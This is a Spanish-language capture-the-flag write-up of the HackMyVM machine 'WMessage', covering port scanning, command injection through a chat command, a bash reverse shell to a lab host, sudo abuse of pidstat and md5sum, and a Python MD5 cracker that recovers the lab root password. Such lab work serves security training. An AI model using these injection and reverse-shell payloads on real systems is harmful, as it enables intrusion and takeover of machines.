---
layout: post
title: WMessage
date: 2022-12-04
categories: ["HMV", "RCE"]
thumbnail: "assets/images/WMessage.png"
---

# VMessage [ Hack My VM ]

### Reconocimiento
##### Descubrimiento de puertos y reconocimiento básico
- `nmap -sS --min-rate 5000 192.168.1.107 -oG allPorts`
- `nmap -sCV -p22,80 192.168.1.107 -oN targeted`

No vemos nada interesante, sigamos investigando.

### Shell
Si entramos a la web veremos un panel `login` y arriba un botón llamado `Sign Up`, por lo que vamos a registrarnos. Una vez registrados veremos una especie de chat. Un tal `Master` nos dice que con el comando `!mpstat` podemos ver el estado del servidor.

Pensé que por detrás se estaba ejecutando un comando a nivel de sistema, así que tratré de inyectar comandos. Tras varios intentos llegué al `pipe` (`|`). Si ponemos `!mpstat | id` nos devolverá el comando ejecutado.

```
Server: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Bien! Podemos ejecutar comandos! Para ganar una Reverse Shell primero me puse en escucha con `NC`, en mi caso por el puerto `4444`:

- `nc -nlvp 4444`

Después de eso me dirigí a [`IronHackers`](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/) y me copié el comando en `Bash`. Vamos a ver cómo nos queda la inyección:

```
!mpstat | bash -c 'bash -i >& /dev/tcp/192.168.1.103/4444 0>&1'
```

Bien! Ya estamos en la máquina como `www-data`!

### Subida de privilegios #1
Una vez dentro de la máquina ejecuté `sudo -l` para listar todo lo que podía hacer:

```Ruby
Matching Defaults entries for www-data on MSG:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
User www-data may run the following commands on MSG:
    (messagemaster) NOPASSWD: /bin/pidstat
```

Como vemos podemos ejecutar `pidstat` como `messagemaster`. En [`GTFObins`](https://gtfobins.github.io/gtfobins/pidstat/#sudo) nos enseñan a escalar privilegios con dicha herramienta, vamos a ver cómo lo hice yo:

- `sudo -u messagemaster /bin/pidstat -e /bin/bash -i`

Bien! Ya estamos como `messagemaster`!

### Subida de privilegios #2
Ahora nuestro objetivo es obtener `root`, por lo que volvemos a ejecutar `sudo -l` para saber qué podemos hacer en la máquina:

```Ruby
Matching Defaults entries for messagemaster on MSG:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
User messagemaster may run the following commands on MSG:
    (ALL) NOPASSWD: /bin/md5sum
```

Vemos que podemos ejecutar `MD5Sum` como cualquier usuario, es decir, podemos ejecutarlo como `root`. Tras mirar en varios sitios no encontré ninguna vulnerabilidad relacionada con dicho binario.

Tras buscar un rato en la máquina llegué a `/var/www`, donde se encontraba un fichero con el nombre `ROOTPASS`. Utilicé `MD5Sum` como `root` para obtener el `hash` y en mi máquina poder romperlo:

- `sudo -u root /bin/md5sum /var/www/ROOTPASS`

```
85c73111b30f9ede8504bb4a4b682f48  /var/www/ROOTPASS
```

Bien! Ya tenemos el `hash`, podemos tratar de romperlo con `John` pero no funcionará. Me creé un `script` en `Python` para que con un diccionario (`rockyou.txt`) vaya línea por línea transformándola en `MD5` y comparándola con el `hash` que tenemos. Vamos a verlo:

```Python
import hashlib

md5 = "85c73111b30f9ede8504bb4a4b682f48"

with open("/usr/share/wordlists/rockyou.txt", encoding="utf-8", errors="ignore") as wordlist:
	lines = wordlist.readlines()
	for passwd in lines:
		passwd = passwd.replace("\n", "")
		hash = hashlib.md5((passwd.strip() + "\n").encode()).hexdigest()
		if str(hash) == md5:
			print(passwd)
```

Tras iniciarlo y esperar unos segundos vemos que sale en nuestra pantalla la contraseña de `root` (`root:Message5687`)!

Bien! Ya estamos en la máquina como `root`! Qué fácil!